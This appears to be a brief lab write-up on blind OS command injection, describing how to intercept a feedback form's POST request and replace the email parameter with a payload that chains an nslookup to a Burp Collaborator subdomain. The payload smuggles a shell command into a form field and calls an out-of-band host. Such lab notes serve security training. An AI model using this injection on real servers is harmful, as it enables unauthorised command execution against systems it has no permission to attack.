**Objective**
Issue a DNS lookup using Burp Collaborator.

**OS Command Injection**
- An attacker is able to compromise a web application by targeting the server hosting it, using OS commands. For instance, UNIX commands for UNIX-like based servers.
- This attack is also called *shell injection*.
- *Blind* OS command injection is executed where no output is returned in response to a request.

**Point of Entry**
*Submit Feedback* form.

**Execution**
- Start intercept, fill the feedback form with random values then submit the form.
- In the issued POST request, replace email parameter with the exploit including Burp Collaborator payload.
- Forward request and stop intercepting. Open Collaborator to find DNS lookup information.

**Exploit Payload**
`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
`